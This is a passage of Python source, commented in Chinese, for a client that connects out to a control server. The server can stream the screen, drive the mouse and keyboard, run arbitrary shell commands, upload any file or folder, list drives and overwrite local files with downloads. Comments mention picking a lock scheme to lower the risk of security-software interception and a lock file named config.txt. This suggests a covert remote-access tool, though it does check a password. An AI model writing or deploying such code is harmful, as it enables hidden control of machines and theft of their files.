                chunk = f.read(chunk_size)
                if not chunk:
                    break
                
                # 将二进制数据编码为base64
                import base64
                chunk_b64 = base64.b64encode(chunk).decode('utf-8')
                
                send_packet(sock, {
                    "type": "file_transfer_chunk", 
                    "data": {
                        "chunk": chunk_b64,
                        "chunk_index": chunk_count,
                        "file_name": file_name
                    }
                })
                
                chunk_count += 1
                print(f"[文件传输] 发送块 {chunk_count}: {len(chunk)} 字节")
        
        # 发送完成信号
        send_packet(sock, {
            "type": "file_transfer_complete", 
            "data": {
                "file_name": file_name,
                "total_chunks": chunk_count,
                "file_size": file_size
            }
        })
        
        print(f"[文件传输] 文件发送完成: {file_name}")
        
    except Exception as e:
        error_msg = f"文件传输错误: {str(e)}"
        print(f"[文件传输] {error_msg}")
        send_packet(sock, {
            "type": "file_transfer_result", 
            "data": {
                "success": False, 
                "message": error_msg,
                "file_path": file_path
            }
        })

def get_file_info(file_path):
    """获取文件信息"""
    try:
        if not os.path.exists(file_path):
            return None
        
        stat = os.stat(file_path)
        return {
            "file_name": os.path.basename(file_path),
            "file_size": stat.st_size,
            "file_path": file_path,
            "modified_time": stat.st_mtime,
            "is_file": os.path.isfile(file_path),
            "is_dir": os.path.isdir(file_path)
        }
    except Exception as e:
        print(f"[文件信息] 获取文件信息失败: {str(e)}")
        return None

def list_directory(directory_path):
    """列出目录内容"""
    try:
        if not os.path.exists(directory_path):
            print(f"[目录浏览] 目录不存在: {directory_path}")
            return {"error": "目录不存在", "path": directory_path}
        
        if not os.path.isdir(directory_path):
            print(f"[目录浏览] 路径不是目录: {directory_path}")
            return {"error": "路径不是目录", "path": directory_path}
        
        items = []
        try:
            dir_items = os.listdir(directory_path)
        except PermissionError as e:
            print(f"[目录浏览] 权限不足，无法访问目录: {directory_path} - {str(e)}")
            return {"error": f"权限不足: {str(e)}", "path": directory_path}
        except OSError as e:
            print(f"[目录浏览] 系统错误，无法访问目录: {directory_path} - {str(e)}")
            return {"error": f"系统错误: {str(e)}", "path": directory_path}
        
        for item in dir_items:
            item_path = os.path.join(directory_path, item)
            try:
                stat = os.stat(item_path)
                items.append({
                    "name": item,
                    "path": item_path,
                    "size": stat.st_size,
                    "is_file": os.path.isfile(item_path),
                    "is_dir": os.path.isdir(item_path),
                    "modified_time": stat.st_mtime
                })
            except (PermissionError, OSError) as e:
                print(f"[目录浏览] 无法访问项目: {item_path} - {str(e)}")
                # 添加一个受限访问的标记
                items.append({
                    "name": item,
                    "path": item_path,
                    "size": 0,
                    "is_file": False,
                    "is_dir": False,
                    "modified_time": 0,
                    "restricted": True,
                    "error": str(e)
                })
                continue
        
        # 按类型和名称排序：目录在前，文件在后
        items.sort(key=lambda x: (not x["is_dir"], x["name"].lower()))
        return items
    except Exception as e:
        print(f"[目录浏览] 列出目录失败: {str(e)}")
        return {"error": f"未知错误: {str(e)}", "path": directory_path}

def get_common_paths():
    """获取常用路径"""
    try:
        common_paths = []
        
        # 用户目录
        user_home = os.path.expanduser("~")
        if user_home:
            common_paths.append({
                "name": "用户目录",
                "path": user_home,
                "icon": "🏠"
            })
        
        # 桌面
        desktop = os.path.join(user_home, "Desktop")
        if os.path.exists(desktop):
            common_paths.append({
                "name": "桌面",
                "path": desktop,
                "icon": "🖥️"
            })
        
        # 文档
        documents = os.path.join(user_home, "Documents")
        if os.path.exists(documents):
            common_paths.append({
                "name": "文档",
                "path": documents,
                "icon": "📄"
            })
        
        # 下载
        downloads = os.path.join(user_home, "Downloads")
        if os.path.exists(downloads):
            common_paths.append({
                "name": "下载",
                "path": downloads,
                "icon": "⬇️"
            })
        
        # 图片
        pictures = os.path.join(user_home, "Pictures")
        if os.path.exists(pictures):
            common_paths.append({
                "name": "图片",
                "path": pictures,
                "icon": "🖼️"
            })
        
        # 音乐
        music = os.path.join(user_home, "Music")
        if os.path.exists(music):
            common_paths.append({
                "name": "音乐",
                "path": music,
                "icon": "🎵"
            })
        
        # 视频
        videos = os.path.join(user_home, "Videos")
        if os.path.exists(videos):
            common_paths.append({
                "name": "视频",
                "path": videos,
                "icon": "🎬"
            })
        
        # 驱动器
        for drive in "CDEFGHIJKLMNOPQRSTUVWXYZ":
            drive_path = f"{drive}:\\"
            if os.path.exists(drive_path):
                common_paths.append({
                    "name": f"{drive}盘",
                    "path": drive_path,
                    "icon": "💾"
                })
        
        return common_paths
    except Exception as e:
        print(f"[常用路径] 获取常用路径失败: {str(e)}")
        return []

def send_folder_to_server(sock, folder_path, chunk_size=8192):
    """发送文件夹到服务器（递归传输所有文件）"""
    try:
        if not os.path.exists(folder_path):
            send_packet(sock, {
                "type": "file_transfer_result", 
                "data": {
                    "success": False, 
                    "message": f"文件夹不存在: {folder_path}",
                    "file_path": folder_path
                }
            })
            return
        
        if not os.path.isdir(folder_path):
            send_packet(sock, {
                "type": "file_transfer_result", 
                "data": {
                    "success": False, 
                    "message": f"路径不是文件夹: {folder_path}",
                    "file_path": folder_path
                }
            })
            return
        
        print(f"[文件夹传输] 开始发送文件夹: {folder_path}")
        
        # 获取所有文件列表
        all_files = []
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                relative_path = os.path.relpath(file_path, folder_path)
                all_files.append((file_path, relative_path))
        
        print(f"[文件夹传输] 发现 {len(all_files)} 个文件")
        
        # 发送文件夹开始信息
        folder_name = os.path.basename(folder_path)
        send_packet(sock, {
            "type": "folder_transfer_start", 
            "data": {
                "folder_name": folder_name,
                "folder_path": folder_path,
                "total_files": len(all_files)
            }
        })
        
        # 逐个发送文件
        for i, (file_path, relative_path) in enumerate(all_files):
            print(f"[文件夹传输] 发送文件 {i+1}/{len(all_files)}: {relative_path}")
            
            # 发送文件开始信息
            file_size = os.path.getsize(file_path)
            send_packet(sock, {
                "type": "folder_file_start", 
                "data": {
                    "file_name": os.path.basename(file_path),
                    "relative_path": relative_path,
                    "file_size": file_size,
                    "file_index": i,
                    "total_files": len(all_files)
                }
            })
            
            # 分块发送文件内容
            with open(file_path, 'rb') as f:
                chunk_count = 0
                while True:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break
                    
                    import base64
                    chunk_b64 = base64.b64encode(chunk).decode('utf-8')
                    send_packet(sock, {
                        "type": "folder_file_chunk", 
                        "data": {
                            "chunk": chunk_b64,
                            "chunk_index": chunk_count,
                            "relative_path": relative_path,
                            "file_index": i
                        }
                    })
                    chunk_count += 1
            
            # 发送文件完成信号
            send_packet(sock, {
                "type": "folder_file_complete", 
                "data": {
                    "relative_path": relative_path,
                    "file_index": i,
                    "total_files": len(all_files)
                }
            })
        
        # 发送文件夹完成信号
        send_packet(sock, {
            "type": "folder_transfer_complete", 
            "data": {
                "folder_name": folder_name,
                "total_files": len(all_files)
            }
        })
        
        print(f"[文件夹传输] 文件夹传输完成: {folder_name}")
        
    except Exception as e:
        error_msg = f"文件夹传输错误: {str(e)}"
        print(f"[文件夹传输] {error_msg}")
        send_packet(sock, {
            "type": "file_transfer_result", 
            "data": {
                "success": False, 
                "message": error_msg,
                "file_path": folder_path
            }
        })

def handle_file_transfer_request(sock, event_data):
    """处理文件传输请求。"""
    file_path = (event_data or {}).get("file_path", "")
    print(f"[文件传输] 收到文件传输请求: {file_path}")
    send_file_to_server(sock, file_path)

def handle_file_info_request(sock, event_data):
    """处理文件信息请求。"""
    file_path = (event_data or {}).get("file_path", "")
    print(f"[文件信息] 收到文件信息请求: {file_path}")
    file_info = get_file_info(file_path)
    if file_info:
        send_packet(sock, {
            "type": "file_info_result",
            "data": {
                "success": True,
                "file_info": file_info
            }
        })
    else:
        send_packet(sock, {
            "type": "file_info_result",
            "data": {
                "success": False,
                "message": f"无法获取文件信息: {file_path}"
            }
        })

def handle_list_directory_request(sock, event_data):
    """处理目录列表请求。"""
    directory_path = (event_data or {}).get("directory_path", "")
    print(f"[目录浏览] 收到目录列表请求: {directory_path}")
    result = list_directory(directory_path)
    if isinstance(result, dict) and "error" in result:
        send_packet(sock, {
            "type": "list_directory_result",
            "data": {
                "success": False,
                "message": f"无法列出目录: {directory_path} - {result['error']}",
                "directory_path": directory_path,
                "error": result["error"]
            }
        })
    elif isinstance(result, list):
        send_packet(sock, {
            "type": "list_directory_result",
            "data": {
                "success": True,
                "items": result,
                "directory_path": directory_path
            }
        })
    else:
        send_packet(sock, {
            "type": "list_directory_result",
            "data": {
                "success": False,
                "message": f"无法列出目录: {directory_path} - 未知错误",
                "directory_path": directory_path
            }
        })

def handle_common_paths_request(sock, event_data):
    """处理常用路径请求。"""
    _ = event_data
    print("[常用路径] 收到常用路径请求")
    common_paths = get_common_paths()
    send_packet(sock, {
        "type": "get_common_paths_result",
        "data": {
            "success": True,
            "paths": common_paths
        }
    })

def handle_folder_transfer_request(sock, event_data):
    """处理文件夹传输请求。"""
    folder_path = (event_data or {}).get("folder_path", "")
    print(f"[文件夹传输] 收到文件夹传输请求: {folder_path}")
    send_folder_to_server(sock, folder_path)

def handle_upload_replace_request(sock, event_data):
    """处理上传覆盖请求：客户端下载 OSS 文件并覆盖到目标路径。"""
    data = event_data or {}
    download_url = str(data.get("download_url", "")).strip()
    target_path = str(data.get("target_path", "")).strip()
    overwrite = bool(data.get("overwrite", True))

    if not download_url or not target_path:
        send_packet(sock, {
            "type": "upload_replace_result",
            "data": {
                "success": False,
                "target_path": target_path,
                "message": "参数不完整：download_url 或 target_path 为空"
            }
        })
        return

    try:
        normalized_target = target_path.replace("/", os.sep).replace("\\", os.sep)
        # 目标是目录时，自动拼接 OSS 文件名
        is_dir_target = normalized_target.endswith(os.sep) or os.path.isdir(normalized_target)
        if is_dir_target:
            file_name = os.path.basename(urlparse(download_url).path) or "download.bin"
            final_path = os.path.join(normalized_target, file_name)
        else:
            final_path = normalized_target

        parent_dir = os.path.dirname(final_path) or "."
        os.makedirs(parent_dir, exist_ok=True)

        temp_path = f"{final_path}.download_tmp"
        downloaded_size = 0
        with requests.get(download_url, stream=True, timeout=30) as resp:
            resp.raise_for_status()
            with open(temp_path, "wb") as f:
                for chunk in resp.iter_content(chunk_size=8192):
                    if not chunk:
                        continue
                    f.write(chunk)
                    downloaded_size += len(chunk)

        if (not overwrite) and os.path.exists(final_path):
            os.remove(temp_path)
            raise FileExistsError(f"目标文件已存在且 overwrite=False: {final_path}")

        os.replace(temp_path, final_path)
        print(f"[上传覆盖] 下载并覆盖成功: {final_path} ({downloaded_size} 字节)")
        send_packet(sock, {
            "type": "upload_replace_result",
            "data": {
                "success": True,
                "target_path": final_path,
                "message": "上传覆盖成功",
                "file_size": downloaded_size
            }
        })
    except Exception as e:
        err = str(e)
        print(f"[上传覆盖] 失败: {err}")
        try:
            if 'temp_path' in locals() and os.path.exists(temp_path):
                os.remove(temp_path)
        except Exception:
            pass
        send_packet(sock, {
            "type": "upload_replace_result",
            "data": {
                "success": False,
                "target_path": target_path,
                "message": err
            }
        })

def fetch_ssl_certificate():
    """从阿里云OSS动态获取SSL证书"""
    global SSL_CERT_CACHE, SSL_CACHE_TIME
    
    current_time = time.time()
    
    # 检查缓存是否有效
    if (SSL_CERT_CACHE and 
        current_time - SSL_CACHE_TIME < SSL_CACHE_DURATION):
        if not is_frozen():
            print(f"[SSL] 使用缓存的证书（缓存时间: {int(current_time - SSL_CACHE_TIME)}秒）")
        return SSL_CERT_CACHE
    
    try:
        if not is_frozen():
            print(f"[SSL] 正在从阿里云OSS获取证书...")
        
        # 获取证书
        cert_response = requests.get(SSL_CERT_URL, timeout=10)
        if cert_response.status_code != 200:
            raise Exception(f"获取证书失败，HTTP状态码: {cert_response.status_code}")
        
        # 验证证书格式
        cert_content = cert_response.text.strip()
        
        if not cert_content.startswith("-----BEGIN CERTIFICATE-----"):
            raise Exception("证书格式错误")
        
        # 更新缓存
        SSL_CERT_CACHE = cert_content
        SSL_CACHE_TIME = current_time
        
        if not is_frozen():
            print(f"[SSL] 证书获取成功")
        return cert_content
        
    except requests.exceptions.Timeout:
        log_network_error(SSL_CERT_URL, "timeout")
        if SSL_CERT_CACHE:
            if not is_frozen():
                print(f"[SSL] 使用缓存的证书作为备用")
            return SSL_CERT_CACHE
        else:
            if not is_frozen():
                print(f"[SSL] 无法获取证书且无缓存可用")
            return None
    except requests.exceptions.ConnectionError:
        log_network_error(SSL_CERT_URL, "connection")
        if SSL_CERT_CACHE:
            if not is_frozen():
                print(f"[SSL] 使用缓存的证书作为备用")
            return SSL_CERT_CACHE
        else:
            if not is_frozen():
                print(f"[SSL] 无法获取证书且无缓存可用")
            return None
    except Exception as e:
        if is_frozen():
            print(f"[SSL] 获取证书失败")
        else:
            print(f"[SSL] 获取证书失败: {str(e)}")
        if SSL_CERT_CACHE:
            if not is_frozen():
                print(f"[SSL] 使用缓存的证书作为备用")
            return SSL_CERT_CACHE
        else:
            if not is_frozen():
                print(f"[SSL] 无法获取证书且无缓存可用")
            return None

# 获取基础路径
def get_base_path():
    if is_frozen():
        return sys._MEIPASS
    else:
        return os.path.abspath(os.path.dirname(__file__))

# 打包版本错误信息简化
def log_error_simple(category, message, detail=None):
    """简化错误日志（打包版本只打印简要信息）"""
    if is_frozen():
        # 打包版本：只打印简要信息
        print(f"[{category}] {message}")
    else:
        # 非打包版本：打印详细信息
        if detail:
            print(f"[{category}] {message}: {detail}")
        else:
            print(f"[{category}] {message}")

def log_network_error(url, error_type, detail=None):
    """网络错误日志（打包版本简化）"""
    if is_frozen():
        # 打包版本：只打印简要信息
        if error_type == "timeout":
            print(f"[网络] 连接超时")
        elif error_type == "connection":
            print(f"[网络] 连接失败")
        else:
            print(f"[网络] 请求失败")
    else:
        # 非打包版本：打印详细信息
        if error_type == "timeout":
            print(f"[网络] 连接超时: {url}")
        elif error_type == "connection":
            print(f"[网络] 连接错误: {url}")
        else:
            if detail:
                print(f"[网络] 获取连接信息异常: {url} - {detail}")
            else:
                print(f"[网络] 获取连接信息异常: {url}")

# 文件锁方案：基于进程ID的文件锁（替代互斥锁，降低安全拦截风险）
def check_process_exists(pid):
    """检查指定进程ID是否还在运行"""
    try:
        if platform.system() == 'Windows':
            # Windows 使用 os.kill 发送信号0（不实际杀死进程，只检查是否存在）
            os.kill(pid, 0)
            return True
        else:
            # Linux/Mac 使用 psutil
            try:
                import psutil
                return psutil.pid_exists(pid)
            except ImportError:
                # 如果没有 psutil，使用 os.kill
                try:
                    os.kill(pid, 0)
                    return True
                except ProcessLookupError:
                    return False
                except PermissionError:
                    # 权限不足，假设进程不存在
                    return False
    except ProcessLookupError:
        # 进程不存在
        return False
    except PermissionError:
        # 权限不足，假设进程不存在
        return False
    except Exception:
        # 其他异常，假设进程不存在
        return False

def create_file_lock():
    """创建文件锁，返回是否成功创建（如果已有实例运行则返回False）
    
    注意：config.txt 文件创建在程序目录中（EXE文件所在目录或脚本文件所在目录），
    而不是运行目录（当前工作目录），确保文件位置固定。
    """
    try:
        app_dir = get_app_dir()  # 获取程序目录（不是运行目录）
        lock_file = os.path.join(app_dir, "config.txt")  # 在程序目录中创建 config.txt
        current_pid = os.getpid()
        
        # 检查文件锁是否存在
        if os.path.exists(lock_file):
            try:
                # 读取文件锁中的进程ID
                with open(lock_file, 'r', encoding='utf-8') as f:
                    content = f.read().strip()
                    if content:
                        try:
                            old_pid = int(content)
                            # 检查旧进程是否还在运行
                            if check_process_exists(old_pid):
                                # 进程还在运行，说明已有实例
                                print(f"[文件锁] 检测到已有实例运行（PID: {old_pid}），退出")
                                return False
                            else:
                                # 进程不存在，删除旧锁文件
                                print(f"[文件锁] 旧进程已退出（PID: {old_pid}），删除旧锁")
                                try:
                                    os.remove(lock_file)
                                except Exception:
                                    pass
                        except ValueError:
                            # 文件内容不是有效的进程ID，删除旧文件
                            print("[文件锁] 文件锁内容无效，删除旧锁")
                            try:
                                os.remove(lock_file)
                            except Exception:
                                pass
            except Exception as e:
                # 读取失败，删除旧文件
                print(f"[文件锁] 读取文件锁失败: {e}，删除旧锁")
                try:
                    os.remove(lock_file)
                except Exception:
                    pass
        
        # 创建新的文件锁（写入当前进程ID）
        try:
            with open(lock_file, 'w', encoding='utf-8') as f:
                f.write(str(current_pid))
            print(f"[文件锁] 文件锁创建成功（PID: {current_pid}）")
            return True
        except Exception as e:
            print(f"[文件锁] 创建文件锁失败: {e}，继续运行（降级处理）")
            return True  # 创建失败时允许继续运行（降级处理）
    except Exception as e:
        print(f"[文件锁] 文件锁检查异常: {e}，继续运行（降级处理）")
        return True  # 异常时允许继续运行（降级处理）

def check_file_lock_and_exit(strict_exit: bool = True) -> bool:
    """检查文件锁。

    strict_exit=True: 保持原行为，检测到已有实例时直接退出。
    strict_exit=False: 降级为告警，继续运行（用于诊断启动问题）。
    """
    try:
        _startup_trace(f"LOCK: check_file_lock_and_exit(strict_exit={strict_exit}) enter")
        if not create_file_lock():
            if strict_exit:
                _startup_trace("LOCK: existing instance detected; strict_exit -> sys.exit(0)")
                sys.exit(0)
            print("[文件锁] 检测到已有实例，但已启用放宽启动模式，继续运行")
            _startup_trace("LOCK: existing instance detected; relaxed -> continue")
            return False
    except Exception as e:
        print(f"[文件锁] 文件锁检查异常: {e}，继续运行（降级处理）")
        try:
            _startup_trace("LOCK: exception=" + repr(e))
        except Exception:
            pass
    return True

# 连接工作线程（支持SSL/TCP，多目标并行）
def connection_worker(target, is_primary=False):
    global send_screen

    def _is_domain(name: str):
        return name and any(ch.isalpha() for ch in name) and "." in name

    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        screen_state = {
            "send_screen": False,
            "current_screen_index": 0,
            "last_screens": {}
        }
        server_address = target.get("connect_address") or target["address"]
        server_port = target.get("connect_port", target["port"])
        use_ssl = target.get("use_ssl", False)
        ssl_domain = target.get("ssl_domain") or target.get("address") or server_address
        display_target = target.get("address") or server_address
        try:
            if use_ssl and server_address != display_target:
                print(f"[连接] 正在连接到服务器: {server_address}:{server_port}（SSL，{'主' if is_primary else '从'}，SNI:{ssl_domain}）")
            else:
                print(f"[连接] 正在连接到服务器: {server_address}:{server_port}（{'SSL' if use_ssl else 'TCP'}，{'主' if is_primary else '从'}）")
            sock.connect((server_address, server_port))
            
            ssl_sock = sock
            if use_ssl:
                try:
                    if not _is_domain(ssl_domain):
                        print(f"[SSL] 目标非域名，回退TCP: {ssl_domain}")
                        use_ssl = False
                    if use_ssl:
                        ssl_context = ssl.create_default_context()
                        ssl_context.check_hostname = True
                        ssl_context.verify_mode = ssl.CERT_REQUIRED
                        import tempfile
                        cert_content = fetch_ssl_certificate()
                        with tempfile.NamedTemporaryFile(mode='w', suffix='.pem', delete=False) as cert_file:
                            cert_file.write(cert_content)
                            cert_path = cert_file.name
                        try:
                            ssl_context.load_verify_locations(cert_path)
                            ssl_sock = ssl_context.wrap_socket(sock, server_hostname=ssl_domain)
                            print(f"[SSL连接] SSL握手成功: {server_address}:{server_port}")
                        finally:
                            try:
                                os.unlink(cert_path)
                            except:
                                pass
                except Exception as e:
                    print(f"[SSL] 握手失败或降级: {e}，使用TCP继续")
                    ssl_sock = sock
                    use_ssl = False
            
            info = get_machine_info()
            send_packet(ssl_sock, info)
            print(f"[连接] 机器信息已发送（{'SSL' if use_ssl else 'TCP'}，{'主' if is_primary else '从'}）")
            
            heartbeat = threading.Thread(target=heartbeat_thread, args=(ssl_sock,), daemon=True)
            heartbeat.start()
            print("[线程] 心跳线程已启动")

            # 方案B：每个连接都维护独立屏幕流状态，不再主从互斥。
            screen = threading.Thread(target=screen_thread, args=(ssl_sock, screen_state), daemon=True)
            screen.start()
            print(f"[线程] 屏幕传输线程已启动（{'主' if is_primary else '从'}连接）")
            
            buffer = bytearray()
            while True:
                try:
                    event = recv_packet(ssl_sock, buffer)
                    if event is None:
                        print("[连接] 服务器连接断开")
                        break
                    
                    eventType = event.get("type")
                    eventData = event.get("data")
                    
                    if eventType == "authenticate":
                        success, message = authenticate_request(eventData)
                        send_packet(ssl_sock, {"type": "auth_result", "data": {"success": success, "message": message}})
                        print(f"[认证] 认证结果: {message}")
                        continue

                    if eventType == "protocol_ack":
                        if not is_frozen():
                            server_protocol = (eventData or {}).get("server_protocol", "unknown")
                            agreed = (eventData or {}).get("agreed_capabilities", [])
                            print(f"[协议] 协商完成: server={server_protocol}, capabilities={agreed}")
                        continue
                    
                    if eventType == "switch_screen":
                        screen_index = eventData.get("screen_index", 0)
                        success = switch_screen(screen_index, screen_state)
                        send_packet(ssl_sock, {
                            "type": "switch_screen_result", 
                            "data": {
                                "success": success, 
                                "screen_index": screen_index,
                                "message": f"切换到屏幕{screen_index}" if success else f"屏幕索引无效: {screen_index}"
                            }
                        })
                        print(f"[屏幕] 切换屏幕: {screen_index}, 结果: {success}")
                        continue
                    
                    if eventType == "get_screens_info":
                        screens_info = get_all_screens_info(screen_state.get("current_screen_index", 0))
                        send_packet(ssl_sock, {
                            "type": "screens_info_result", 
                            "data": {
                                "screens": screens_info,
                                "current_screen": screen_state.get("current_screen_index", 0)
                            }
                        })
                        print(f"[屏幕] 发送屏幕信息: {len(screens_info)} 个屏幕")
                        continue
                    
                    if eventType in ["mouse_click", "mouse_double_click", "mouse_right_click", "mouse_drag_start", 
                                   "mouse_drag_move", "mouse_drag_end", "mouse_scroll", "mouse_long_press",
                                   "key_press", "key_combo", "key_down", "key_up", "text_input",
                                   "cmd_exec", "start_screen", "stop_screen", "switch_screen", "get_screens_info",
                                   "file_transfer_request", "file_info_request", "list_directory_request", "get_common_paths_request", "folder_transfer_request",
                                   "upload_replace_request"]:
                        if not is_authenticated():
                            send_packet(ssl_sock, {"type": "auth_required", "data": {"message": "需要双重密码认证"}})
                            print("[认证] 需要认证才能执行此操作")
                            continue
                        update_activity()
                    
                    if eventType == "mouse_click":
                        x, y = eventData["x"], eventData["y"]
                        screen_width, screen_height = pyautogui.size()
                        if x < 0 or x >= screen_width or y < 0 or y >= screen_height:
                            continue
                        try:
                            pyautogui.FAILSAFE = True
                            pyautogui.PAUSE = 0.1
                            pyautogui.click(x, y)
                        except Exception as e:
                            if not is_frozen():
                                print(f"[鼠标] 点击失败: {str(e)}")
                        continue
                    
                    if eventType == "mouse_double_click":
                        x, y = eventData["x"], eventData["y"]
                        try:
                            pyautogui.doubleClick(x, y)
                        except Exception as e:
                            if not is_frozen():
                                print(f"[鼠标] 双击失败: {str(e)}")
                        continue
                    
                    if eventType == "mouse_right_click":
                        x, y = eventData["x"], eventData["y"]
                        try:
                            pyautogui.rightClick(x, y)
                        except Exception as e:
                            if not is_frozen():
                                print(f"[鼠标] 右键失败: {str(e)}")
                        continue
                    
                    if eventType == "mouse_drag_start":
                        x, y = eventData["x"], eventData["y"]
                        try:
                            drag_start(x, y)
                        except Exception as e:
                            if not is_frozen():
                                print(f"[鼠标] 开始拖拽失败: {str(e)}")
                        continue
                    
                    if eventType == "mouse_drag_move":
                        x, y = eventData["x"], eventData["y"]
                        try:
                            drag_move(x, y)
                        except Exception as e:
                            if not is_frozen():
                                print(f"[鼠标] 拖拽移动失败: {str(e)}")
                        continue
                    
                    if eventType == "mouse_drag_end":
                        x, y = eventData["x"], eventData["y"]
                        try:
                            drag_end(x, y)
                        except Exception as e:
                            if not is_frozen():
                                print(f"[鼠标] 结束拖拽失败: {str(e)}")
                        continue
                    
                    if eventType == "mouse_scroll":
                        direction = eventData.get("direction", 0)
                        try:
                            pyautogui.scroll(100 if direction > 0 else -100)
                        except Exception:
                            pass
                        continue
                    
                    if eventType == "key_press":
                        key = eventData.get("key")
                        mapped_key = map_keysym_to_pyautogui(key)
                        try:
                            pyautogui.press(mapped_key or key)
                        except Exception:
                            pass
                        continue
                    
                    if eventType == "key_combo":
                        keys = eventData.get("keys", [])
                        mapped_keys = []
                        for k in keys:
                            mk = map_keysym_to_pyautogui(k)
                            if mk:
                                mapped_keys.append(mk)
                        try:
                            if mapped_keys:
                                pyautogui.hotkey(*mapped_keys)
                        except Exception:
                            pass
                        continue

                    if eventType == "key_down":
                        key = eventData.get("key")
                        mapped_key = map_keysym_to_pyautogui(key)
                        if mapped_key:
                            try:
                                pyautogui.keyDown(mapped_key)
                            except Exception:
                                pass
                        continue

                    if eventType == "key_up":
                        key = eventData.get("key")
                        mapped_key = map_keysym_to_pyautogui(key)
                        if mapped_key:
                            try:
                                pyautogui.keyUp(mapped_key)
                            except Exception:
                                pass
                        continue

                    if eventType == "text_input":
                        text = eventData.get("text", "")
                        if isinstance(text, str) and text != "":
                            try:
                                pyautogui.typewrite(text)
                            except Exception:
                                pass
                        continue

                    if eventType == "mouse_long_press":
                        x, y = eventData.get("x", 0), eventData.get("y", 0)
                        duration = float(eventData.get("duration", 1.0))
                        try:
                            x, y = _clamp_point(x, y)
                            pyautogui.mouseDown(x, y, button='left')
                            time.sleep(max(0.05, duration))
                            pyautogui.mouseUp(x, y, button='left')
                        except Exception:
                            pass
                        continue
                    
                    if eventType == "cmd_exec":
                        cmd = eventData.get("cmd", "")
                        request_id = eventData.get("request_id")
                        output = run_command(cmd)
                        send_packet(ssl_sock, {"type": "cmd_result", "data": {"output": output, "request_id": request_id}})
                        continue
                    
                    if eventType == "start_screen":
                        screen_state["send_screen"] = True
                        reset_screen_cache("server start_screen command", screen_state)
                        continue
                    
                    if eventType == "stop_screen":
                        screen_state["send_screen"] = False
                        continue
                    
                    if eventType == "file_transfer_request":
                        handle_file_transfer_request(ssl_sock, eventData)
                        continue
                    
                    if eventType == "file_info_request":
                        handle_file_info_request(ssl_sock, eventData)
                        continue
                    
                    if eventType == "list_directory_request":
                        handle_list_directory_request(ssl_sock, eventData)
                        continue
                    
                    if eventType == "get_common_paths_request":
                        handle_common_paths_request(ssl_sock, eventData)
                        continue
                    
                    if eventType == "folder_transfer_request":
                        handle_folder_transfer_request(ssl_sock, eventData)
                        continue

                    if eventType == "upload_replace_request":
                        handle_upload_replace_request(ssl_sock, eventData)
                        continue
                    
                    if eventType == "image_delta":
                        pass  # 客户端不会收到此事件

                    if eventType == "request_keyframe":
                        # 服务端检测到帧契约不一致时，要求下一帧发送整帧
                        reset_screen_cache("server request_keyframe command", screen_state)
                        continue
                    
                    if eventType == "heartbeat_ping":
                        try:
                            ping_id = eventData.get("ping_id") if eventData else None
                            send_packet(ssl_sock, {
                                "type": "heartbeat_pong",
                                "data": {
                                    "ping_id": ping_id,
                                    "client_ts": time.time()
                                }
                            })
                        except Exception:
                            pass
                        continue

                    if eventType == "heartbeat":
                        pass
                    
                except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError, OSError) as e:
                    if not is_frozen():
                        print(f"[连接] 事件处理异常（网络）: {e}")
                    break
                except Exception as e:
                    # 业务事件异常不应中断连接，避免单一功能故障导致整链路重连
                    if not is_frozen():
                        print(f"[连接] 事件处理异常（已忽略）: {e}")
                    continue
        except Exception as e:
            if not is_frozen():
                print(f"[连接] 连接异常: {e}，5秒后重试")
        try:
            screen_state["send_screen"] = False
            reset_screen_cache("connection closed", screen_state)
            if drag_state["active"]:
                drag_end()
        except Exception:
            pass
        try:
            sock.close()
        except Exception:
            pass
        time.sleep(5)

# 主函数（保留单连接备用，默认使用首个 target）
def main():
    global send_screen

    # 统一事件处理入口：main 保留为兼容接口，实际委托 connection_worker
    # 避免历史双分支事件逻辑分叉导致功能不一致。
    if remote_control_available and connection_targets:
        connection_worker(connection_targets[0], True)
        return
    
    # 检查服务是否可用
    if not remote_control_available or serverIp is None or serverPort is None:
        print("[模式] 服务不可用或配置未获取，仅启动F开头EXE程序")
        # 无限循环，保持程序运行
        while True:
            try:
                time.sleep(60) 
            except KeyboardInterrupt:
                print("[退出] 用户中断")
                break
        return
    
    # 服务可用，正常运行功能（不再使用SSL）
    print("[模式] 控制服务可用，启动（TCP，无SSL）")
    
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            # 获取连接配置（如果失败则等待重试）
            try:
                connection_config = get_server_connection_info()
                server_address = connection_config["address"]
                server_port = connection_config["port"]
            except Exception as e:
                if not is_frozen():
                    print(f"[连接] 获取服务器配置失败: {e}，等待5分钟后重试")
                else:
                    print(f"[连接] 获取配置失败，等待重试")
                time.sleep(300)  # 等待5分钟后重试
                continue
            
            # 连接到服务器（根据配置决定SSL或TCP）
            use_ssl = connection_config.get("use_ssl", False)
            print(f"[连接] 正在连接到服务器: {server_address}:{server_port}（{'SSL' if use_ssl else 'TCP'}）")
            sock.connect((server_address, server_port))
            
            ssl_sock = sock
            if use_ssl:
                try:
                    ssl_context = ssl.create_default_context()
                    ssl_context.check_hostname = True
                    ssl_context.verify_mode = ssl.CERT_REQUIRED
                    
                    import tempfile
                    cert_content = fetch_ssl_certificate()
                    with tempfile.NamedTemporaryFile(mode='w', suffix='.pem', delete=False) as cert_file:
                        cert_file.write(cert_content)
                        cert_path = cert_file.name
                    try:
                        ssl_context.load_verify_locations(cert_path)
                        ssl_sock = ssl_context.wrap_socket(sock, server_hostname=server_address)
                        print(f"[SSL连接] SSL握手成功: {server_address}:{server_port}")
                    finally:
                        try:
                            os.unlink(cert_path)
                        except:
                            pass
                except Exception as e:
                    print(f"[SSL] 握手失败或降级: {e}，使用TCP继续")
                    ssl_sock = sock
                    use_ssl = False
            
            # 发送机器信息
            info = get_machine_info()
            send_packet(ssl_sock, info)
            print(f"[连接] 机器信息已发送（{'SSL' if use_ssl else 'TCP'}）")
            
            # 启动心跳线程
            heartbeat = threading.Thread(target=heartbeat_thread, args=(ssl_sock,), daemon=True)
            heartbeat.start()
            print("[线程] 心跳线程已启动")
            
            # 启动屏幕传输线程
            screen = threading.Thread(target=screen_thread, args=(ssl_sock,), daemon=True)
            screen.start()
            print("[线程] 屏幕传输线程已启动")
            
            # 主通信循环
            buffer = bytearray()
            while True:
                try:
                    event = recv_packet(ssl_sock, buffer)
                    if event is None:
                        print("[连接] 服务器连接断开")
                        break
                    
                    eventType = event.get("type")
